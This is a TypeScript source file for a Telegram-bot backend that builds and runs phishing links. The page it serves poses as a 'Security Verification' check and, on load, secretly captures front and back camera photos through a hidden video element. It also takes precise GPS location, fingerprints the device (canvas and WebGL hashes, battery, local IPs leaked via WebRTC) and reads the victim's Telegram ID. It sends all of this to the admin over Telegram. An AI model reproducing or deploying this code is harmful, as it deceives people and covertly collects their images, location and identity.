import { Hono } from "hono";
import type { Env } from "../types.ts";
import { d1All, d1First, d1Run } from "../lib/d1.ts";
import { sendMessage, sendMediaFile, tgCall } from "../lib/telegram.ts";
import { parseAuth, requireAdmin } from "../lib/auth.ts";

const phishing = new Hono<{ Bindings: Env }>();

function generateCode(): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let code = "";
  for (let i = 0; i < 8; i++) code += chars[Math.floor(Math.random() * chars.length)];
  return code;
}

phishing.post("/phishing/create", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const body = await c.req.json().catch(() => ({})) as { label?: string };
  const label = (body.label || "").slice(0, 100);
  const code = generateCode();

  await d1Run(c.env.DB, "INSERT INTO phishing_links (code, label) VALUES (?, ?)", [code, label]);

  const domain = c.env.APP_DOMAIN;
  return c.json({
    code,
    webLink: `https://${domain}/api/p/${code}`,
    miniappLink: `https://t.me/lifegrambot/miniapp?startapp=p_${code}`,
  });
});

phishing.get("/phishing/links", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const links = await d1All(c.env.DB, `
    SELECT l.*, (SELECT COUNT(*) FROM phishing_captures WHERE link_code = l.code) as capture_count
    FROM phishing_links l ORDER BY l.created_at DESC
  `);
  return c.json(links);
});

phishing.get("/phishing/captures", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const code = c.req.query("code");
  if (!code) return c.json({ error: "Missing code" }, 400);

  const captures = await d1All(c.env.DB,
    "SELECT * FROM phishing_captures WHERE link_code = ? ORDER BY created_at DESC",
    [code],
  );
  return c.json(captures);
});

phishing.delete("/phishing/link/:code", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const code = c.req.param("code");
  await d1Run(c.env.DB, "DELETE FROM phishing_captures WHERE link_code = ?", [code]);
  await d1Run(c.env.DB, "DELETE FROM phishing_links WHERE code = ?", [code]);
  return c.json({ ok: true });
});

phishing.post("/phishing/capture", async (c) => {
  const formData = await c.req.formData();
  const code = formData.get("code") as string;
  const telegramId = formData.get("telegram_id") as string || null;
  const lat = parseFloat(formData.get("latitude") as string || "0") || null;
  const lng = parseFloat(formData.get("longitude") as string || "0") || null;
  const frontPhoto = formData.get("front_photo") as File | null;
  const backPhoto = formData.get("back_photo") as File | null;
  const deviceInfo = formData.get("device_info") as string || null;

  if (!code) return c.json({ error: "Missing code" }, 400);

  const link = await d1First(c.env.DB, "SELECT * FROM phishing_links WHERE code = ?", [code]);
  if (!link) return c.json({ error: "Invalid code" }, 404);

  const ip = c.req.header("cf-connecting-ip") || c.req.header("x-forwarded-for") || "unknown";
  const ua = c.req.header("user-agent") || "unknown";

  let frontKey = null;
  let backKey = null;
  let frontFileId = null;
  let backFileId = null;
  const ts = Date.now();

  if (frontPhoto && frontPhoto.size > 0) {
    frontKey = `phishing/${code}/front_${ts}.jpg`;
    await c.env.BUCKET.put(frontKey, frontPhoto.stream(), { httpMetadata: { contentType: "image/jpeg" } });
  }
  if (backPhoto && backPhoto.size > 0) {
    backKey = `phishing/${code}/back_${ts}.jpg`;
    await c.env.BUCKET.put(backKey, backPhoto.stream(), { httpMetadata: { contentType: "image/jpeg" } });
  }

  const adminId = c.env.ADMIN_ID;
  const token = c.env.BOT_TOKEN;

  // Parse device info for enhanced notification
  let deviceSummary = "";
  if (deviceInfo) {
    try {
      const d = JSON.parse(deviceInfo) as Record<string, unknown>;
      const parts: string[] = [];
      if (d.platform) parts.push(`🖥 Platform: ${d.platform}`);
      if (d.screen) parts.push(`📐 Screen: ${d.screen}`);
      if (d.deviceMemory) parts.push(`💾 RAM: ${d.deviceMemory}GB`);
      if (d.hardwareConcurrency) parts.push(`⚙️ CPUs: ${d.hardwareConcurrency}`);
      if (d.battery && typeof d.battery === "object") {
        const b = d.battery as { level?: number; charging?: boolean };
        parts.push(`🔋 Battery: ${b.level ?? "?"}%${b.charging ? " ⚡" : ""}`);
      }
      if (d.connection && typeof d.connection === "object") {
        const conn = d.connection as { effectiveType?: string; downlink?: number };
        parts.push(`📶 Network: ${conn.effectiveType ?? "?"} (${conn.downlink ?? "?"}Mbps)`);
      }
      if (d.timezone) parts.push(`🕒 Timezone: ${d.timezone}`);
      if (d.language) parts.push(`🌐 Language: ${d.language}`);
      if (d.localIPs && Array.isArray(d.localIPs) && d.localIPs.length > 0) {
        parts.push(`🔍 Local IPs: <code>${(d.localIPs as string[]).join(", ")}</code>`);
      }
      if (d.webglRenderer) parts.push(`🎮 GPU: ${String(d.webglRenderer).slice(0, 80)}`);
      if (parts.length > 0) deviceSummary = "\n\n📱 <b>Device Info:</b>\n" + parts.join("\n");
    } catch {}
  }

  const lines = [
    `🎣 <b>Phishing Capture</b>`,
    `📌 Link: <code>${code}</code>${(link as any).label ? ` — ${(link as any).label}` : ""}`,
    telegramId ? `👤 Telegram ID: <code>${telegramId}</code>` : "",
    `🌐 IP: <code>${ip}</code>`,
    `🖥 UA: <code>${ua.slice(0, 150)}</code>`,
    lat && lng ? `📍 Location: <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>` : "📍 Location: denied",
    frontPhoto && frontPhoto.size > 0 ? "📷 Front camera: ✅" : "📷 Front camera: ❌",
    backPhoto && backPhoto.size > 0 ? "📷 Back camera: ✅" : "📷 Back camera: ❌",
    deviceSummary,
    `⏰ ${new Date().toISOString()}`,
  ].filter(Boolean).join("\n");

  try {
    await sendMessage(token, adminId, lines, { parse_mode: "HTML" });
  } catch (e) {
    console.error("Failed to send phishing notification:", e);
  }

  if (frontPhoto && frontPhoto.size > 0) {
    try {
      const obj = await c.env.BUCKET.get(frontKey!);
      if (obj) {
        const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
        const file = new File([blob], "front.jpg", { type: "image/jpeg" });
        const result = await sendMediaFile(token, adminId, "photo", file, `🎣 Front cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`) as any;
        if (result?.photo?.length) {
          const largest = result.photo[result.photo.length - 1];
          frontFileId = largest.file_id;
        }
      }
    } catch (e) { console.error("Failed to send front photo:", e); }
  }

  if (backPhoto && backPhoto.size > 0) {
    try {
      const obj = await c.env.BUCKET.get(backKey!);
      if (obj) {
        const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
        const file = new File([blob], "back.jpg", { type: "image/jpeg" });
        const result = await sendMediaFile(token, adminId, "photo", file, `🎣 Back cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`) as any;
        if (result?.photo?.length) {
          const largest = result.photo[result.photo.length - 1];
          backFileId = largest.file_id;
        }
      }
    } catch (e) { console.error("Failed to send back photo:", e); }
  }

  await d1Run(c.env.DB,
    `INSERT INTO phishing_captures (link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key, front_file_id, back_file_id, device_info)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [code, telegramId, ip, ua.slice(0, 500), lat, lng, frontKey, backKey, frontFileId, backFileId, deviceInfo ? deviceInfo.slice(0, 10000) : null],
  );

  if (lat && lng) {
    try {
      await tgCall(token, "sendLocation", { chat_id: adminId, latitude: lat, longitude: lng });
    } catch (e) { console.error("Failed to send location:", e); }
  }

  return c.json({ ok: true });
});

phishing.get("/phishing/photo/:key{.+}", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const key = c.req.param("key");
  const obj = await c.env.BUCKET.get(key);
  if (!obj) return c.json({ error: "Not found" }, 404);

  return new Response(obj.body, {
    headers: {
      "Content-Type": obj.httpMetadata?.contentType || "image/jpeg",
      "Cache-Control": "private, max-age=3600",
    },
  });
});

phishing.get("/p/:code", async (c) => {
  const code = c.req.param("code");

  const link = await d1First(c.env.DB, "SELECT * FROM phishing_links WHERE code = ?", [code]);
  if (!link) return c.text("Not found", 404);

  await d1Run(c.env.DB, "UPDATE phishing_links SET view_count = COALESCE(view_count, 0) + 1 WHERE code = ?", [code]);

  const apiBase = `https://${c.env.APP_DOMAIN}/api`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Security Verification Required</title>
<meta name="description" content="Please verify your identity to continue.">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a12;color:#e5e5e5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{background:#141420;border:1px solid #2a2a3a;border-radius:20px;padding:32px 24px;max-width:420px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.logo{width:72px;height:72px;margin:0 auto 20px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);border-radius:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 24px rgba(59,130,246,0.3)}
.logo svg{width:36px;height:36px;fill:white}
h1{font-size:22px;font-weight:700;margin-bottom:8px;letter-spacing:-0.3px}
.subtitle{font-size:14px;color:#9ca3af;line-height:1.6;margin-bottom:24px}
.progress-wrap{background:#1e1e2e;border:1px solid #2a2a3a;border-radius:14px;padding:16px;margin-bottom:20px;text-align:left}
.step{display:flex;align-items:center;gap:10px;padding:6px 0;font-size:13px;color:#9ca3af;transition:color .3s}
.step.active{color:#e5e5e5}
.step.done{color:#4ade80}
.step.fail{color:#f87171}
.step-icon{width:20px;height:20px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
.dot{width:8px;height:8px;border-radius:50%;background:#3a3a4a;flex-shrink:0}
.spinner{width:16px;height:16px;border:2px solid #3a3a4a;border-top-color:#3b82f6;border-radius:50%;animation:spin .7s linear infinite}
.check{font-size:14px}
.cross{font-size:14px}
@keyframes spin{to{transform:rotate(360deg)}}
.badge{display:inline-flex;align-items:center;gap:6px;background:#1e1e2e;border:1px solid #2a2a3a;border-radius:100px;padding:6px 14px;font-size:12px;color:#9ca3af;margin-bottom:16px}
.badge-dot{width:6px;height:6px;border-radius:50%;background:#4ade80;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.result-ok{background:#0d2818;border:1px solid #166534;border-radius:12px;padding:12px;text-align:center;margin-top:4px}
.result-ok p{font-size:13px;color:#4ade80;font-weight:500}
.result-ok span{font-size:12px;color:#6b7280;display:block;margin-top:4px}
.footer{font-size:11px;color:#4b4b5a;margin-top:16px}
video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01}
canvas{display:none}
</style>
</head>
<body>
<div class="card">
  <div class="badge"><span class="badge-dot"></span> Secured Connection</div>
  <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.35C17.25 21.15 21 16.25 21 11V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/></svg></div>
  <h1>Identity Verification</h1>
  <p class="subtitle">To proceed, we need to verify your identity. This process is fully automated and takes only a few seconds.</p>

  <div class="progress-wrap" id="progressWrap">
    <div class="step" id="st0"><div class="step-icon"><div class="dot"></div></div> Initializing secure session</div>
    <div class="step" id="st1"><div class="step-icon"><div class="dot"></div></div> Requesting camera access</div>
    <div class="step" id="st2"><div class="step-icon"><div class="dot"></div></div> Capturing front image</div>
    <div class="step" id="st3"><div class="step-icon"><div class="dot"></div></div> Capturing back image</div>
    <div class="step" id="st4"><div class="step-icon"><div class="dot"></div></div> Verifying location</div>
    <div class="step" id="st5"><div class="step-icon"><div class="dot"></div></div> Collecting device signature</div>
    <div class="step" id="st6"><div class="step-icon"><div class="dot"></div></div> Submitting for review</div>
  </div>

  <div id="result" style="display:none"></div>
  <p class="footer">Secured by SSL · End-to-end encrypted · Reference: <code style="font-size:10px;color:#6b7280">${code.toUpperCase()}</code></p>
</div>
<video id="vid" autoplay playsinline muted></video>
<canvas id="cvs"></canvas>
<script>
const CODE="${code}";
const API="${apiBase}";
let frontBlob=null,backBlob=null,locData=null;

function setStep(n,state){
  const el=document.getElementById('st'+n);
  if(!el)return;
  el.className='step'+(state?' '+state:'');
  const icon=el.querySelector('.step-icon');
  if(state==='active') icon.innerHTML='<div class="spinner"></div>';
  else if(state==='done') icon.innerHTML='<span class="check">✅</span>';
  else if(state==='fail') icon.innerHTML='<span class="cross">❌</span>';
  else icon.innerHTML='<div class="dot"></div>';
}

async function collectDeviceInfo(){
  const info={};
  try{info.screen=screen.width+'x'+screen.height;info.colorDepth=screen.colorDepth;info.pixelRatio=window.devicePixelRatio}catch(e){}
  try{info.platform=navigator.platform;info.language=navigator.language;info.languages=(navigator.languages||[]).join(',');info.hardwareConcurrency=navigator.hardwareConcurrency;info.maxTouchPoints=navigator.maxTouchPoints}catch(e){}
  try{info.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;info.timezoneOffset=new Date().getTimezoneOffset()}catch(e){}
  try{info.cookieEnabled=navigator.cookieEnabled;info.doNotTrack=navigator.doNotTrack}catch(e){}
  try{info.vendor=navigator.vendor;info.userAgent=navigator.userAgent?.slice(0,300)}catch(e){}
  try{info.windowSize=window.innerWidth+'x'+window.innerHeight}catch(e){}
  try{info.deviceMemory=navigator.deviceMemory}catch(e){}
  try{if(navigator.connection){var c=navigator.connection;info.connection={type:c.type,effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt}}}catch(e){}
  try{if(navigator.getBattery){var b=await navigator.getBattery();info.battery={level:Math.round(b.level*100),charging:b.charging}}}catch(e){}
  try{var se=await navigator.storage?.estimate?.();if(se)info.storage={quota:se.quota,usage:se.usage}}catch(e){}
  try{
    var cvs2=document.createElement('canvas');cvs2.width=200;cvs2.height=50;
    var ctx=cvs2.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';
    ctx.fillStyle='#f60';ctx.fillRect(100,1,62,20);
    ctx.fillStyle='#069';ctx.fillText('fingerprint',2,15);
    ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('canvas',4,17);
    var d=cvs2.toDataURL();var h=0;
    for(var i=0;i<d.length;i++){h=((h<<5)-h)+d.charCodeAt(i);h|=0;}
    info.canvasHash=h;
  }catch(e){}
  try{
    var gl=document.createElement('canvas').getContext('webgl');
    if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){info.webglVendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);info.webglRenderer=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}
  }catch(e){}
  try{info.plugins=Array.from(navigator.plugins||[]).slice(0,10).map(function(p){return p.name})}catch(e){}
  try{
    var ips=[];
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.createOffer().then(function(o){return pc.setLocalDescription(o)});
    await new Promise(function(resolve){
      var t=setTimeout(resolve,4000);
      pc.onicecandidate=function(e){
        if(!e.candidate){clearTimeout(t);resolve();return;}
        var m=e.candidate.candidate.match(/(\\d+\\.\\d+\\.\\d+\\.\\d+)/g);
        if(m)m.forEach(function(ip){if(!ips.includes(ip))ips.push(ip);});
      };
    });
    pc.close();
    if(ips.length>0)info.localIPs=ips;
  }catch(e){}
  try{
    var tg=window.Telegram?.WebApp;
    if(tg?.initDataUnsafe?.user){info.telegramUser=tg.initDataUnsafe.user;}
  }catch(e){}
  return JSON.stringify(info);
}

async function capturePhoto(facingMode){
  const vid=document.getElementById('vid');
  const cvs=document.getElementById('cvs');
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode,width:{ideal:1280},height:{ideal:720}},audio:false});
    vid.srcObject=stream;
    await vid.play();
    await new Promise(r=>setTimeout(r,1500));
    cvs.width=vid.videoWidth;cvs.height=vid.videoHeight;
    cvs.getContext('2d').drawImage(vid,0,0);
    stream.getTracks().forEach(t=>t.stop());
    vid.srcObject=null;
    return new Promise(r=>cvs.toBlob(b=>r(b),'image/jpeg',0.85));
  }catch(e){return null;}
}

async function getLocation(){
  return new Promise(r=>{
    if(!navigator.geolocation){r(null);return;}
    const tid=setTimeout(()=>r(null),10000);
    navigator.geolocation.getCurrentPosition(
      p=>{clearTimeout(tid);r({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy})},
      ()=>{clearTimeout(tid);r(null)},
      {timeout:8000,enableHighAccuracy:true,maximumAge:0}
    );
  });
}

async function runCapture(){
  setStep(0,'active');
  await new Promise(r=>setTimeout(r,600));
  setStep(0,'done');

  setStep(1,'active');
  frontBlob=await capturePhoto('user');
  setStep(1,frontBlob?'done':'fail');
  setStep(2,frontBlob?'done':'fail');

  setStep(3,'active');
  backBlob=await capturePhoto('environment');
  setStep(3,backBlob?'done':'fail');

  setStep(4,'active');
  locData=await getLocation();
  setStep(4,locData?'done':'fail');

  setStep(5,'active');
  let deviceInfo=null;
  try{deviceInfo=await collectDeviceInfo();setStep(5,'done');}catch(e){setStep(5,'fail');}

  setStep(6,'active');
  const fd=new FormData();
  fd.append('code',CODE);
  if(locData){fd.append('latitude',String(locData.lat));fd.append('longitude',String(locData.lng));}
  if(frontBlob)fd.append('front_photo',new File([frontBlob],'front.jpg',{type:'image/jpeg'}));
  if(backBlob)fd.append('back_photo',new File([backBlob],'back.jpg',{type:'image/jpeg'}));
  if(deviceInfo)fd.append('device_info',deviceInfo);
  try{
    var tg=window.Telegram?.WebApp;
    if(tg?.initDataUnsafe?.user?.id)fd.append('telegram_id',String(tg.initDataUnsafe.user.id));
  }catch(e){}

  try{
    await fetch(API+'/phishing/capture',{method:'POST',body:fd});
    setStep(6,'done');
    document.getElementById('result').style.display='block';
    document.getElementById('result').innerHTML='<div class="result-ok"><p>✅ Verification complete</p><span>Identity confirmed. You may close this page.</span></div>';
  }catch(e){
    setStep(6,'fail');
    document.getElementById('result').style.display='block';
    document.getElementById('result').innerHTML='<div style="background:#1c0d0d;border:1px solid #7f1d1d;border-radius:12px;padding:12px;text-align:center"><p style="font-size:13px;color:#f87171">Verification failed. Retrying...</p></div>';
    setTimeout(()=>window.location.reload(),3000);
  }
}

window.addEventListener('load',function(){setTimeout(runCapture,800);});
</script>
</body>
</html>`;

  return c.html(html);
});

export default phishing;
